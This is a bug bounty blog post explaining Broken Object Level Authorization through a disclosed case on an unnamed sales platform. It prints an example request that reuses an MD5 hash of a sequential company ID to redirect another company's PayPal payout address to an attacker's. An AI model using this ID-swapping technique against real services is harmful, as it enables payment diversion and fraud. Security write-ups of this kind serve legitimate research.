---
layout: post
title:  From Broken Object Level Authorization(BOLA) to the Massive Financial Attack
description: Hey everyone, today we’re going to talk about how web applications can be affected by a Broken Object Level Authorization (BOLA) vulnerability, and I’m also going to give you an exploit case example.
date:   2024-05-14 11:01:35 +0300
image:  '/images/110.jpg'
tags:   [bug bounty, web]
---
Hey everyone, today we’re going to talk about how web applications can be affected by a Broken Object Level Authorization (BOLA) vulnerability, and I’m also going to give you an exploit case example.

> Basically, the BOLA vulnerability allows an attacker to manipulate the parameters of a request to access features or functionality that shouldn’t be available to them. This occurs when the application relies exclusively on client-supplied data to determine authorization levels, rather than doing proper validation on the server.
>

A common example of this vulnerability is when a web application has URLs that include parameters identifying specific objects, such as user IDs or post IDs. If the application does not verify that the authenticated user has permission to access that particular object before granting access, an attacker could easily modify the parameter value to access information or resources that should not be accessible to them.

This vulnerability could allow an attacker to access, modify, or delete other users’ data, view sensitive information, perform unauthorized actions, and compromise the overall security of the system.

This vulnerability combined with a sales management system can cause big problems, don’t you think? That’s what we’ll look at in our exploration case.

# Exploitation Case
In the following example, I will explain how the analysis flow was when I found a critical 0day vulnerability. As simple as it may seem, believe me, many applications worldwide are susceptible to BOLA vulnerabilities, which affect very important functionalities and can cause significant damage.
Let's imagine we are logged into our company account on a website that manages sales. By accessing our account settings, we have all the settings related to our store, products, prices, orders, customers, discount coupons, PayPal address, and other details.

To exploit this type of vulnerability, we can access our account settings and, with the Burp Suite proxy turned on, capture the request that performs the action.

### 1.0 Request:
{% highlight js %}
POST /configuration/sales/d800cfdb966ea519943368dd0507d8f2/edit
{
    "sales_receipt_address":{
        "paypal":"company@company.com"
        "other": null
        "other": null
    }
}
{% endhighlight %}

Alright, now let’s crack MD5 hash and check what it refers to…

{% highlight js %}
d800cfdb966ea519943368dd0507d8f2: 1998711
{% endhighlight %}

### 1.1 Response:
{% highlight js %}
HTTP/2 200 OK
{
  "message":"Sales Receipt Address changed successfully"
}
{% endhighlight %}

We were able to locate our account/company ID within the sales and management system.

By changing the number to 1998710 and encrypting it, let’s send the request and see what happens…

### 2.0 Request:

{% highlight js %}
POST /configuration/sales/e240ba36881c274bdce70af41b71fd6e/edit
{
  "sales_receipt_address":{
    "paypal":"hacker@address.com"
    "other": null
    "other": null
  }
}
{% endhighlight %}

### 2.1 Response:

{% highlight js %}
HTTP/2 200 OK
{
  "message":"Sales Receipt Address changed successfully"
}
{% endhighlight %}

And so it was possible to change the address for receiving payments from account/company sales without necessarily needing any authorization..

Later I found other places vulnerable to BOLA in which I was able to confirm that the change really worked.

![](/images/130.jpg)


Fortunately, the company has already been notified and has already corrected the problem.

This was just one of the cases of exploitation of the BOLA vulnerability, it can be present in several companies from the most varied sectors, financial, e-commerce, health, industrial.